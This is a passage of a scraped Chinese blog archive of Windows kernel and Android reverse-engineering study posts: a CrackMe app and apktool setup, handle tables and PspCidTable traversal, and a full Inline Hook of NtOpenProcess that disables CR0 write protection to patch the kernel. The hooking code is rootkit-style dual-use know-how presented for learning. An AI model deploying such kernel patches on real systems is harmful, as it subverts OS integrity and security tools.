参考文章：https://blog.csdn.net/qq_41988448/article/details/103585673","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Android程序分析入门（准备工作）","slug":"Android程序分析入门-上","date":"2020-05-03T11:00:11.000Z","updated":"2022-05-16T16:00:10.049Z","comments":true,"path":"2020/05/03/Android程序分析入门-上/","link":"","permalink":"http://cata1oc.github.io/2020/05/03/Android%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8-%E4%B8%8A/","excerpt":"","text":"前言停更了一周，其实前些天倒是也学了点，但是五一假期太诱人了，都想把事情放在假期来做，然而前两天基本上就睡过去了，所以拖到了今天。Android这部分，2月份疫情期间学了不少，不过之后开始更新Windows内核的内容了，也就没续上，之前又做了一遍实验，发现很多坑都没有再踩。所以这篇可能会漏掉部分我以前遇到的坑。 之前有计划在3月下旬就开始更新Android，后来发现，由于先前日更的缘故，周末其实也是比较赶进度的，所以拖了很久，现在不日更了，Windows内核的基础部分，也就差个多核同步以及APC了，所以就可以偶尔穿插的更新些Android相关的了，把这部分的内容再巩固下。（题外话，瀚哥真是个狠人，感觉他醒着的时间都在学习新的内容，认识这个世界，太佩服了） 回到本篇的内容，我计划是在博客里演示一遍虫神书上的第一个逆向实验，但是需要一些准备工作，比如CrackMe程序代码的编写，部分Android逆向用到的工具下载及配置等等，所以这篇叫做准备工作，具体程序逆向分析，会在下一篇进行。 编写Android程序首先我们需要编写一个简单的Android程序，实现一个低级的注册功能（仅有前端部分），然后再逆向分析，破解这个程序。一个Android程序主要编写的是布局文件和功能实现的部分，这两部分，分别使用xml和Java/Kotlin语言编写（本篇采用Java）下面来看代码 activity_main.xml布局文件，本次实验采用的约束布局（ConstaintLayout），相关内容可参考此处 xml123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 androidx.constraintlayout.widget.ConstraintLayout> MainActivity.java这里采用MD5算法，根据输入的用户名计算出一个哈希值，作为用来校验的注册码。具体实现部分，用到了Java提供的MessageDigest类，使用方法可以参考此篇文章 java1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768package com.droider.crackme_0x1;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.os.Message;import android.view.View;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class MainActivity extends AppCompatActivity { private Button btn_reg; private EditText ed_name, ed_code; private void initialView(){ btn_reg = (Button)findViewById(R.id.btn_reg); ed_name = (EditText)findViewById(R.id.ed_name); ed_code = (EditText)findViewById(R.id.ed_code); btn_reg.setOnClickListener(new MyListener()); } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); initialView(); } class MyListener implements View.OnClickListener { @Override public void onClick(View v){ String inputName = ed_name.getText().toString(); String inputCode = ed_code.getText().toString(); MessageDigest md = null; try { md = MessageDigest.getInstance(\"MD5\"); md.update(inputName.getBytes()); byte[] result = md.digest(); StringBuffer sb = new StringBuffer(); for(int i = 0; i < result.length/2; i++) { int val = result[i] & 0xff; sb.append(val); } if(sb.toString() == inputCode){ Toast.makeText(MainActivity.this, R.string.success, Toast.LENGTH_SHORT).show(); } else { Toast.makeText(MainActivity.this, R.string.unsuccess, Toast.LENGTH_SHORT).show(); } } catch (NoSuchAlgorithmException e) { e.printStackTrace(); } Toast.makeText(MainActivity.this, \"Failed\", Toast.LENGTH_SHORT).show(); } }} 程序运行下面在Android虚拟机上运行app： 可以看到，当我们输入用户名以及校验码的时候，会显示Register Failed，原因是我们输入的校验码是错的；当输入正确的校验码时会显示Register Succeed。下一篇会学习如何通过逆向暴破这个程序。本篇是准备工作，所以此时程序已经满足了我们的要求，下面介绍一下本次实验用到的工具及其相关内容。 右键命令行右键命令行设置主要是为了方便，因为后期逆向的程序越来越多，分布在不同的文件夹，有些命令需要在命令行中执行（Basn on Windows执行不了时），进入命令行如果从切换盘开始一点点找，固然是麻烦的一件事，但有了右键命令行就可以较为方便的定位到当前目录下。比如我在写博客时用的Git Bash就设置了右键快捷键，可以在切换到博客目录后再进入Git Bash，不用打开后不停的用cd命令切换那么麻烦。 下面来看一下如何在右键快捷键中设置命令行： 首先Win+r ，输入Regedit，进入注册表 接着，我们查找路径 Code1计算机\\HKEY_CLASSES_ROOT\\Directory\\Background\\shell 找到shell后，右键新建一个项，并命名为OpenCmdHere，这时，里面会有一个默认值，我们修改默认值的数值数据为“在此处打开命令行窗口”，这一步是设置右键看到的描述。然后再新建一个字符串值，名称设置为“Icon”，数值数据设置为cmd.exe，这一步是设置右键看到的图标。具体操作完了的情况如下图： 接下来，我们选择OpenCmdHere并新建一个项，命名为command，并修改默认值的数值数据为“cmd.exe /s /k pushd “%V””，具体如下图： 以上全部设置完后，退出注册表，随便进入一个文件夹，单机右键，就可以看到已经成功在右键快捷键中设置命令行。 ApkTool在Android逆向分析中，会用到很多工具，例如Apktool，AndroidKiller，dex2jar，jd-gui等等，本篇中只介绍本次实验中会用到的工具，其余等到后期进一步作逆向分析时再讨论。 进入ApkTool官网，这里面有详细的安装教程，针对不同操作系统的都有，这里简单概述一下： 去这里下载最新版的apktool.jar，例如我下载的是当前最新版本的apktool_2.4.1.jar（最好一定要下载最新版本的，不然反汇编Apk文件时会发生错误）下载后，将apktool_2.4.1.jar重命名为apktool.jar 下载批处理文件，由于官网好像挂掉了，我就直接复制我这份的： bat123456789101112131415161718192021222324252627282930313233343536@echo offsetlocalset BASENAME=apktool_chcp 65001 2>nul >nulrem Find the highest version .jar available in the same directory as the scriptsetlocal EnableDelayedExpansionpushd \"%~dp0\"if exist apktool.jar ( set BASENAME=apktool goto skipversioned)set max=0for /f \"tokens=1* delims=-_.0\" %%A in ('dir /b /a-d %BASENAME%*.jar') do if %%~B gtr !max! set max=%%~nB:skipversionedpopdsetlocal DisableDelayedExpansionrem Find out if the commandline is a parameterless .jar or directory, for fast unpack/repackif \"%~1\"==\"\" goto loadif not \"%~2\"==\"\" goto loadset ATTR=%~a1if \"%ATTR:~0,1%\"==\"d\" ( rem Directory, rebuild set fastCommand=b)if \"%ATTR:~0,1%\"==\"-\" if \"%~x1\"==\".apk\" ( rem APK file, unpack set fastCommand=d):loadjava -jar -Duser.language=en -Dfile.encoding=UTF8 \"%~dp0%BASENAME%%max%.jar\" %fastCommand% %*rem Pause when ran non interactivelyfor /f \"tokens=2\" %%# in (\"%cmdcmdline%\") do if /i \"%%#\" equ \"/c\" pause 新建一个批处理（.bat）文件，命名为apktool，将上述内容copy进去然后保存 将apktool.bat和apktool.jar复制到C:\\Windows目录下，如下图所示： 完成上述操作后，进入命令行，输入apktool，若结果如下图所示，说明apktool安装成功 AndroidKillerApktool是对apk文件反汇编用的，AndroidKiller则可以用来分析，修改，签名等操作，当然，它也可以设置Apktool插件从而增加反汇编功能。默认也是有的。 AndroidKiller可以直接去52pojie的爱盘下载，下载压缩包后解压，有个AndroidKiller.exe，点击即可食用。 本次实验是采用apktool在命令行中对apk文件进行反编译的，想在AndroidKiller中完成也行，但是需要更新一下插件，用前文中下载的最新版的apktool.jar替换目录AndroidKiller_v1.3.1\\bin\\apktool\\apktool下的ShakaApktool.jar，即可。 到这，准备工作也就完成了，过几天会再更新一篇，正式对我们编写的android程序进行逆向分析，有关AndroidKiller更多的使用方法可以参考吾爱破解上的一篇文章。这里不再赘述。 参考链接参考书籍：《Android软件安全权威指南》—— 丰生强 参考文章： https://www.jianshu.com/p/17ec9bd6ca8a https://blog.csdn.net/hudashi/article/details/8394158a https://blog.csdn.net/mooneve/article/details/78821843 http://www.yishimei.cn/computer/700.html https://www.52pojie.cn/thread-726176-1-1.html","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://cata1oc.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"全局句柄表","slug":"全局句柄表","date":"2020-04-26T13:18:15.000Z","updated":"2020-04-26T16:29:34.021Z","comments":true,"path":"2020/04/26/全局句柄表/","link":"","permalink":"http://cata1oc.github.io/2020/04/26/%E5%85%A8%E5%B1%80%E5%8F%A5%E6%9F%84%E8%A1%A8/","excerpt":"","text":"基本概念 进程的句柄表是私有的，每个进程都有一个自己的句柄表 系统拥有一个全局的句柄表，通过全局变量PspCidTable获取到全局句柄表的地址 每个进程和线程都有一个唯一的编号：PID和CID，这两个值就是该内核对象在全局句柄表中的索引 与局部句柄表的差异 全局句柄表的句柄直接指向内核对象；局部句柄表的句柄指向_OBJECT_HEADER，所以在运算时还需加上0x18字节 全局句柄表只有进程和线程这俩内核对象的句柄；局部句柄表包含了当前进程所有打开的内核对象，不限于进程和线程，还有互斥体等。 全局句柄表结构全局句柄表的结构取决于TableCode的低2位的值： 取0x00时：最多可以存储512个句柄（4KB/8Byte = 512） 取0x01时：第一级可以存1024个地址，第二级用来存句柄。最多可存1024x512个句柄 取0x10时：第一级可以存1024个地址，每个第二级的表也存1024个地址，第三级表存句柄。最多可存1024x1024x512个句柄 具体如下图所示： 查找全局句柄表常规方式下面按照步骤，通过Windbg实现查找全局句柄表中的进程句柄 在虚拟机中打开计算器，并在任务管理器中确定进程PID的值 根据全局变量PspCidTable，定位_HANDLE_TABLE结构体 根据_HANDLE_TABLE中的TableCode字段，以及PID的值（用于索引），来确定句柄的位置。注意事项如下： 1）观察TableCode后2位的值，判断是否需要跨表 2）3环PID是四字节的值，但是句柄在内核是8字节，因此寻址时需要PID/4*8 根据句柄的低四字节，找到对应的内核对象。注意事项如下： 1）全局句柄表的句柄是直接指向内核对象结构体的，所以不需要加0x18字节 2）根据低四字节查找时，需清空后3bit属性位再进行运算 代码查找思路由于PspCidTable无法直接引用，在代码实现的过程中，需要一些其它技巧 1）特征搜索 PsLookupProcessThreadByCid()PsLookupProcessByProcessId()PsLookupThreadByThreadId() 这三个函数都会根据PID或者CID去查找全局句柄表。在这个过程中，就会用到PspCidTable，这样我们可以通过Hook这三个函数，就可以借用PspCidTable这个值，找到全局句柄表了。由于这三个函数都是未导出的，所以需要通过特征搜索先进行定位，特征搜索可以参考之前的文章 2）KPCR KPCR有一个成员，KdVersionBlock。这个成员非常奇妙，在他指向地址（+0x80）位置处有一个地址，这个地址指向的就是PspCidTable。具体如下图所示： 因此我们可以在驱动中采用如下手法。获取到PspCidTable Code1234567PULONG PspCidTable_asm { mov eax, fs:[0x34] mov eax, [eax + 0x80] mov eax, [eax] mov PspCidTable, eax} 当然，这个KdVersionBlock指向的地址还能找到一些其它的值： +0x10：KernelBase +0x18/+0x70：PsLoadedModuleList +0x78：PsActiveProcessHead +0x88：ExpSystemResourcesList 遍历全局句柄表有了获取PspCidTable的方法后，我们就可以试着遍历一下全局句柄表，例如打印每个进程的进程名。 代码实现c123456789101112131415161718192021222324252627282930313233343536373839#include \"ntifs.h\"VOID Driver_Unload(PDRIVER_OBJECT pDriver);VOID TraverseProcess();NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING RegistryPath) { TraverseProcess(); pDriver->DriverUnload = Driver_Unload; return STATUS_SUCCESS;}VOID TraverseProcess() { PULONG PspCidTable, TableCode; PUCHAR pEPROCESS; _asm { mov eax, fs:[0x34] mov eax, [eax + 0x80] mov eax, [eax] mov PspCidTable, eax mov eax, [eax] mov TableCode, eax } DbgPrint(\"%x, %x\\n\", PspCidTable, TableCode); for (int i = 0; i < 500; i++) { TableCode = TableCode + 2; // DbgPrint(\"Index: %d, TableCode: %x \\n\",i, *TableCode); if (*TableCode != 0) { pEPROCESS = (PUCHAR)((*TableCode) & 0xfffffff8); DbgPrint(\"%s\\n\", (PULONG)(pEPROCESS + 0x174)); } }}VOID Driver_Unload(PDRIVER_OBJECT pDriver) { DbgPrint(\"Unload Success!\\n\");} 实验效果由于代码比较草率，并没有过滤掉线程结构体，所以会有较多的乱码，但仍然可以打印出所有的进程 参考资料参考书籍：《Windows内核原理与实现》——潘爱民 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?t=143&p=68 参考文章： https://blog.csdn.net/weixin_42052102/article/details/83479303 https://blog.csdn.net/qq_41988448/article/details/104945311 https://www.cnblogs.com/joneyyana/p/12595525.html 参考笔记：张嘉杰，时间刺客.","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"句柄表","slug":"句柄表","date":"2020-04-23T12:44:09.000Z","updated":"2020-04-26T03:28:14.169Z","comments":true,"path":"2020/04/23/句柄表/","link":"","permalink":"http://cata1oc.github.io/2020/04/23/%E5%8F%A5%E6%9F%84%E8%A1%A8/","excerpt":"","text":"句柄今天来介绍一个熟悉的概念，句柄。早在Win32编程时，海哥曾提到，我们不必去理解句柄是什么，只要记住它是一个4字节的DWORD数即可。但是到了内核层面，就有必要深入了解一下这个概念了。 一直以来，我们接触到的句柄主要分为两种： 1）窗口句柄c1HWND hwnd = FindWindow(NULL,\"计算器\"); 例如上面这个代码，就是从桌面获取到一个已经打开了的窗口的句柄，这个句柄相当于这个窗口的编号，通过这个编号，便可以快速访问到这个窗口。 2）内核句柄c1HANDLE g_hMutex = CreateMutex(NULL,FALSE, \"XYZ\"); 窗口句柄是作用于窗口对象的，内核句柄则是对应了一个内核对象，这也是通常而言我们所说的句柄。正如上面例子所示，当一个进程创建或者打开一个内核对象时，将获得一个句柄（相当于内核对象的一个编号），通过这个句柄可以访问内核对象（例如进程，线程，互斥体等）。 为什么要有句柄前面提到过，句柄相当于内核对象的编号，3环的程序可以根据这个编号，来使用这个内核对象。这样就避免了3环程序直接访问到内核对象；由于内核对象位于0环，如果3环的程序可以直接访问内核对象，一旦访问到无效的内核地址，就会导致蓝屏 句柄表在认识了句柄之后，来了解一下句柄表。前面提到了，当一个进程创建或者打开一个内核对象时，将获得一个句柄；那么当这个进程，打开或创建多个内核对象时，就会获得多个句柄，这些句柄，就会存到一个叫做句柄表的结构里。先来看看句柄表这个结构在哪。 句柄表的位置 在_EPROCESS结构体+0xC4偏移处，有一个字段ObjectTable，其指向了一个HANDLE_TABLE的结构体，这就是句柄表结构体。 各个字段具体含义如下： c1234567891011121314+0x000 TableCode :ULONG_PTR //指向句柄表的存储结构+0x004 QuotaProcess : _EPROCESS//句柄表记录的内存资源记录在此进程中+0x008 UniqueProcessId : Void//创建进程的ID，用于回调函数+0x00c HandleTableLock : [4] _EX_PUSH_LOCK//句柄表锁 (仅在句柄表拓展时使用)+0x01c HandleTableList : _LIST_ENTRY //所有句柄表形成一个链表,链表头为全局变量HandleTableListHand+0x024 HandleContentionEvent : _EX_PUSH_LOCK//若在访问句柄表时发生竞争,则在此推锁上等待+0x028 DebugInfo : //调试信息，当调试句柄时才有意义+0x02c ExtraInfoPages : //审计信息所占用的页面数量+0x030 FirstFree : //空闲链表表头的句柄索引+0x034 LastFree : //最近被释放的句柄索引，用于FIFO类型空闲链表+0x038 NextHandleNeedingPool : //下一次句柄表拓展的起始句柄索引+0x03c HandleCount : //正在使用的句柄表项的数量+0x040 Flags : //标志域+0x040 StrictFIFO : //是否使用FIFO风格的重用，既先释放先重用 本篇主要关注TableCode这个字段，其余字段在用到时会再作分析。TableCode它指向了一个表，这个表存储了当前进程所打开的所有句柄。下面来看一个例子： 在虚拟机中，先打开应用程序计算器，然后运行如下代码： c1234567891011121314151617181920#include \"stdafx.h\"#include \"Windows.h\"int main(int argc, char* argv[]){ DWORD pid; HANDLE hProcess; HWND hwnd = FindWindow(NULL,\"计算器\"); GetWindowThreadProcessId(hwnd, &pid); for (int i = 0; i < 10; i++) { hProcess = OpenProcess(PROCESS_ALL_ACCESS,TRUE, pid); printf(\"句柄：%x\\n\", hProcess); } getchar(); return 0;} 在这个代码中，我们会在程序中重复10次打开计算器 根据打印的结果来看，可以发现，尽管是打开的是同一个进程，但是每次打开时的句柄都不一样。下面我们来根据句柄表的位置来查找一下这些句柄： 首先，在Windbg中，根据进程结构体地址，确定句柄表结构体所在位置 然后，在句柄表结构体中，找到存储句柄表的存储结构所在地址 最后，根据句柄表存储结构的地址，找到当前进程所打开的别的进程的句柄 这里有一点需要说明一下，在应用层，句柄是一个四字节的数，但是在内核存储时，句柄表的每个成员是8字节，因此在查询的时候，3环得到句柄的值需要先除以4再乘8，才能在句柄表中找到对应的句柄（3环句柄相当于是一个查询的编号）。现在我们知道如何通过进程的句柄表找到其打开进程的句柄。现在我们来看看0环中这个句柄的结构。 句柄的结构先来看看句柄的结构是如何定义的（取自潘爱民老师的Windows内核原理与实现） c1234567891011121314151617181920212223typedef struct _HANDLE_TABLE_ENTRY{ union { PVOID Object; //指向句柄所代表的对象 (bit31- bit0) ULONG_PTR ObAttributes; //最低3位有特别含义，参见OBJ_HANDLE_ATTRIBUTES宏定义 PHANDLE_TABLE_ENTRY_INFO InfoTable; //各个句柄表页面的第一个句柄表项，使用此成员指向一张表 ULONG_PTR Value; }; union { union { ULONG GrantedAccess; //访问掩码 struct { //当NtGlobalFlag中包含 FLE_KERNEL_STACK_TRACE_DB 标记时使用 USHORT GrantedAccessIndex; USHORT CreatorBackTraceIndex; }; }; LONG NextFreeTableEntry; //空闲时表示下一个句柄表索引 };} HANDLE_TABLE_ENTRY, *PHANDLE_TABLE_ENTRY; 直接看结构定义的话，有太多的联合体，看着比较费劲，下面用一张图来解释一下（图片取自张嘉杰的笔记） 句柄共8字节，64位，主要分为4个部分，接下来按照标记依次介绍： （bit48~bit63）这一块共计两个字节，16位；高位字节是给SetHandleInformation这个函数用的，例如当执行如下语句： c1SetHandleInformation(Handle,HANDLE_FLAG_PROTECT_FROM_CLOSE,HANDLE_FLAG_PROTECT_FROM_CLOSE); 这个位置将会被写入0x02 （bit32~bit47）这一块也是两个字节，16位；这块是访问掩码，是给OpenProcess这个函数用的，即OpenProcess的第一个参数 DWORD dwDesiredAccess的值 （bit0~bit31）这两块共计四个字节，32位，各个位主要含义如下： bit0：OBJ_PROTECT_CLOSE，表示调用者是否允许关闭该句柄；默认值为1 bit1：OBJ_INHERIT，指示该进程创建的子进程是否可以继承该句柄，即是否将该句柄项拷贝到它们的 句柄表中 bit2：OBJ_AUDIT_OBJECT_CLOSE，指示关闭该对象时是否产生一个审计事件；默认值为0 bit3~31：存放该内核对象在内核中的具体地址 内核对象_OBJECT_HEADER通过上文的学习了，我们了解到句柄的低32位可以获取到内核对象的地址。之前的文章学习过，例如进程，线程，互斥体都属于内核对象，并且它们都有各自的结构体，那是不是句柄指向的地址就是这些结构体的地址呢？其实不然，拿进程来举例，内核对象在开头都有一个0x18字节的_OBJECT_HEADER结构，这是内核对象的头部，也就是说从0x18字节开始， 才是进程结构体开始的位置。_OBJECT_HEADER结构如下 这个_Object_Header包含一些对内核对象的描述信息，其中一个字段Type，指明了内核对象的类型，并包含更多的描述信息 进程查找在进程与线程相关篇章中，我们学习了很多种查找进程的方式，现在又多了一种，就是通过句柄表。有了上面的基础后，可以总结出这么一个思路： 已知当前进程EPROCESS -> _HANDLE_TABLE（EPROCESS+0xc4）-> TableCode -> _OBJECT_HEADER（TableCode + 3环句柄/4*8）-> 打开的进程EPROCESS（OBJECT_HEADER+0x18） 下面简要演示一下这个过程： 第一步：获取3环句柄 第二步：EPROCESS -> _HANDLE_TABLE（EPROCESS+0xc4） 第三步： _HANDLE_TABLE（EPROCESS+0xc4）-> TableCode 第四步：TableCode -> _OBJECT_HEADER（TableCode + 3环句柄/48，*这里注意查询时要将后3bit清零**） -> 打开的进程EPROCESS（OBJECT_HEADER+0x18） 关于反调试句柄表和反调试，进程遍历也是息息相关的，进程遍历会在下一篇全局句柄表中再作分析。这里简单介绍反调试。一个进程加载进内存后，可以起一个线程，专门去遍历其他所有进程的句柄表，如果发现，某个进程的句柄表中有自己进程的句柄，说明自己的这个进程可能正在被调试，就算没有在被调试，也至少被打开了，这时就可以强行关闭自己的程序，不被调试，达到反调试的目的。当然反调试有很多种手段，在调试章节会再作分析。 总结 一个进程可以创建、打开很多内核对象，这些内核对象的地址存储在当前进程的句柄表中。我们在应用层得到的句柄值，实际上就是当前进程句柄表的索引。 同一个内核对象可以被不同的进程所引用，但句柄的值可能一样也可能不一样。 通过句柄表可以找到当前进程所打开或创建的其它内核对象。 参考资料参考书籍：《Windows内核原理与实现》——潘爱民 参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=67 参考文章： https://blog.csdn.net/weixin_42052102/article/details/83476572 https://blog.csdn.net/qq_41988448/article/details/104945311 https://www.cnblogs.com/joneyyana/p/12595525.html 参考笔记：张嘉杰，时间刺客.","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Inline Hook SSDT","slug":"Inline-Hook-SSDT","date":"2020-04-20T02:21:29.000Z","updated":"2020-04-20T06:57:38.673Z","comments":true,"path":"2020/04/20/Inline-Hook-SSDT/","link":"","permalink":"http://cata1oc.github.io/2020/04/20/Inline-Hook-SSDT/","excerpt":"","text":"一个月前，曾更过一篇博客，简要介绍了使用Hook手段实现对某社交软件实时聊天内容的输出打印。那次实中使用的手段就是Inline Hook，在那篇文章中也比较详细的介绍了如何编写Inline Hook的代码。本篇不再赘述Hook具体细节，简要说明原理并演示Hook过程。 Inline Hook原理无论是3环还是0环，Inline Hook的原理是一样的： 通过修改函数中的指令，改变程序执行的流程 跳转到自己定义的代码段中执行 最后再返回到原始函数中 注意：Hook期间修改掉的原始函数中的代码部分要写入到自身程序中，以保证程序能够完整运行。在Hook结束后（获取自身想要的数据或执行部分功能后），再将修改的部分字节写回到原本的地方，完成Unhook，实现无痕Hook。 Inline Hook SSDT思路本篇通过Inline Hook SSDT，实现和SSDT Hook同样的功能（定义SSDT结构、找到SSDT表、修改物理页属性），相同部分将省略，可参考前一篇SSDT Hook中的代码。 选择Hook点SSDT Hook和Inline Hook的最大区别在于，SSDT Hook仅需要修改系统服务表中的地址即可，而Inline Hook需要找到相应的函数，修改函数中的部分指令，让新的指令执行时会跳转到自己的函数。通常情况下，Inline Hook会根据需要修改字节的大小，选择不同的修改指令，主要有以下三种： Code11. jmp xxxxxxxx (5字节) Code12. push xxxxxxxx/retn (6字节) Code13. mov eax, xxxxxxxx/jmp eax (7字节) 本次实验选取的Hook函数仍然是NtOpenProcess 个人习惯使用6字节的指令进行修改，这里选取了距离NtOpenProcess函数起始地址0x14偏移处的6个字节指令，这6个字节刚好对应3行指令。适合作为Hook点。 构造自己的函数与SSDT Hook不同，Inline Hook不需要构造一个类似的MyNtOpenProcess写入到系统服务表中，因为本身执行的就是NtOpenProcess函数，只是执行时会跳转到我们的代码中继续执行，所以我们需要构造一个自己的函数，用于实现部分功能。 通常情况下，自己实现的函数采用裸函数的形式。这样编译器不会自动帮你生成例如： Code12345_asm { push ebp mov ebp, esp sub esp, 0x??} 这样的指令。因为这样会导致堆栈发生变化，获取参数会变得困难。 本次实验实现的功能，同样是打印NtOpenProcess传入进来的参数。那么就有一个新的问题？如何获取参数呢？这里涉及到3环逆向的一些基本知识，这里只做简要分析 观察NtOpenProcess部分反汇编，可以发现，在Hook点之前，并没有参数通过常用的传参寄存器（ebx，eax，ecx）传入参数，后面部分的汇编，已经给eax/ecx赋值了，说明参数不是通过寄存器传参的，所以一定是通过堆栈传参的。这样就很方便了，我们可以通过[ebp+0x8]，[ebp+0xc]，[ebp+0x10]，[ebp+0x14]。获取到NtOpenProcess的参数，用全局变量保存参数，并在自己的函数中打印。代码如下： c123456789101112131415161718192021222324252627282930313233//用于接收参数的全局变量ULONG ProcessHandle;ULONG DesiredAccess;ULONG ObjectAttributes;ULONG ClientId;//定义实现自己功能的函数VOID __declspec(naked) MyOwnNtFunction() { __asm { pushad pushfd mov eax, [ebp + 0x8] mov ProcessHandle, eax mov eax, [ebp + 0xc] mov DesiredAccess, eax mov eax, [ebp + 0x10] mov ObjectAttributes, eax mov eax, [ebp + 0x14] mov ClientId, eax } DbgPrint(\"ProcessHandle: %x, DesiredAccess: %x, ObjectAttributes: %x, ClientId: %x\\n\", ProcessHandle, DesiredAccess, ObjectAttributes, ClientId); __asm { pushfd pushad xor eax, eax lea edi, [ebp - 0x28] stos dword ptr es : [edi] jmp JmpBackAddr }} 最后一段嵌入的汇编有何用呢？也是非常重要的，因为我们修改了原始函数的6个字节，也就是3行指令，为了保证程序正常执行，需要在自己的函数中添加上这3行指令，执行后直接跳转到3行指令之后的位置执行即可保证程序正常执行。 构造修改指令因个人习惯，Inline Hook比较爱使用6字节的方式，主要原因是懒得算Jmp造成的偏移……这部分的手法在Hook聊天内容那篇文章讲过，这里仅作简要说明： 初始化一个6个字节的数组 下标0的位置设置为”\\x68”，即push 0x????????指令对应的硬编码 下标5的位置设置为”\\xc3”，即ret指令对应的硬编码（这里采用\\x，是用来表明这是个16进制数） 下标1~4的位置，设置成自己函数的地址 实现代码如下： c1234//设置修改部分指令Modify_Byte[0] = '\\x68';*(ULONG*)(Modify_Byte + 1) = (ULONG)(MyOwnNtFunction);Modify_Byte[5] = '\\xc3'; Hook与Unhook既然有Hook，也要有Unhook完成卸载。由于Inline Hook原理是修改指令对应的硬编码，因此使用RtlMoveMemory来实现对Hook点部分的代码进行修改，注意不能忘记修改物理页的属性。代码如下： c12345678910111213//Hook函数VOID HookNtOpenProcess() { PageProtectOff(); RtlMoveMemory((PUCHAR)ModifyAddr, Modify_Byte, 6); PageProtectOn();}//Unhook函数VOID UnHookNtOpenProcess() { PageProtectOff(); RtlMoveMemory((PUCHAR)ModifyAddr, Recover_Byte, 6); PageProtectOn();} 功能演示 Hook前代码 Hook执行后 可以在DbgView中看到不断有NtOpenProcess函数的参数在被输出，说明Hook成功，实现了和SSDT Hook同样的功能。 打开Windbg断下后查看NtOpenProcess函数代码 发现原本的代码已经被替换成了我们自己的代码，会跳转到自己的函数中。 打开PC Hunter，内核钩子选项 可以看到PC Hunter同样检测到了我们的对大小为6个字节Hook的代码 最后，我们选择停止驱动的执行。完成UnHook的操作，这时再去查看代码 可以看到代码已经完整的修改回去了 完整代码c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#include \"ntddk.h\"//定义系统服务表结构typedef struct _KSYSTEM_SERVICE_TABLE { PULONG ServiceTableBase; //服务函数地址表基址 PULONG Count; ULONG ServiceLimit; //服务函数的个数 PULONG ArgmentTableBase; //服务函数参数表地址}KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;//定义系统服务描述符表（SSDT）结构typedef struct _KSERVICE_DESCRIPTOR_TABLE { KSYSTEM_SERVICE_TABLE ntoskrnl; //ntoskrnl.exe的服务函数 KSYSTEM_SERVICE_TABLE win32k; //win32k.sys的服务函数，(GDI32.dll/User32.dll 的内核支持) KSYSTEM_SERVICE_TABLE notUsed1; KSYSTEM_SERVICE_TABLE notUsed2;}KSERVICE_DESCRIPTOR_TABLE, *PSERVICE_DESCRIPTOR_TABLE;extern PKSYSTEM_SERVICE_TABLE KeServiceDescriptorTable;//函数声明VOID HookNtOpenProcess();VOID UnHookNtOpenProcess();VOID PageProtectOff();VOID PageProtectOn();VOID Driver_Unload(PDRIVER_OBJECT pDriverObj);//定义原函数为全局变量ULONG OriginFunctionAddr;ULONG ModifyAddr;ULONG JmpBackAddr;UCHAR Modify_Byte[6] = {0};UCHAR Recover_Byte[6] = {0x33, 0xc0, 0x8d, 0x7d, 0xd8, 0xab};//用于接收参数的全局变量ULONG ProcessHandle;ULONG DesiredAccess;ULONG ObjectAttributes;ULONG ClientId;VOID __declspec(naked) MyOwnNtFunction() { __asm { pushad pushfd mov eax, [ebp + 0x8] mov ProcessHandle, eax mov eax, [ebp + 0xc] mov DesiredAccess, eax mov eax, [ebp + 0x10] mov ObjectAttributes, eax mov eax, [ebp + 0x14] mov ClientId, eax } DbgPrint(\"ProcessHandle: %x, DesiredAccess: %x, ObjectAttributes: %x, ClientId: %x\\n\", ProcessHandle, DesiredAccess, ObjectAttributes, ClientId); __asm { pushfd pushad xor eax, eax lea edi, [ebp - 0x28] stos dword ptr es : [edi] jmp JmpBackAddr }}NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING RegistryPath) { DbgPrint(\"Driver is running!\\n\"); OriginFunctionAddr = (KeServiceDescriptorTable->ServiceTableBase)[0x7A]; ModifyAddr = OriginFunctionAddr + 0x14; JmpBackAddr = ModifyAddr + 0x6; DbgPrint(\"OriginFunctionAddr: %x\\n \\ ModifyAddr: %x\\n \\ JmpBackAddr: %x\\n\", OriginFunctionAddr, ModifyAddr, JmpBackAddr); //Check Modify Byte Modify_Byte[0] = '\\x68'; *(ULONG*)(Modify_Byte + 1) = (ULONG)(MyOwnNtFunction); Modify_Byte[5] = '\\xc3'; for (ULONG i = 0; i < 6; i++) { DbgPrint(\"%x \", Modify_Byte[i]); } HookNtOpenProcess(); pDriverObj->DriverUnload = Driver_Unload; return STATUS_SUCCESS;}VOID HookNtOpenProcess() { PageProtectOff(); RtlMoveMemory((PUCHAR)ModifyAddr, Modify_Byte, 6);// DbgPrint(\"Hook Starting...\\n\"); PageProtectOn();}VOID UnHookNtOpenProcess() { PageProtectOff(); RtlMoveMemory((PUCHAR)ModifyAddr, Recover_Byte, 6); PageProtectOn();}VOID PageProtectOff() { __asm { cli mov eax, cr0 and eax, not 0x10000 mov cr0, eax }}VOID PageProtectOn() { __asm { mov eax, cr0 or eax, 0x10000 mov cr0, eax sti }}VOID Driver_Unload(PDRIVER_OBJECT pDriverObj) { UnHookNtOpenProcess(); 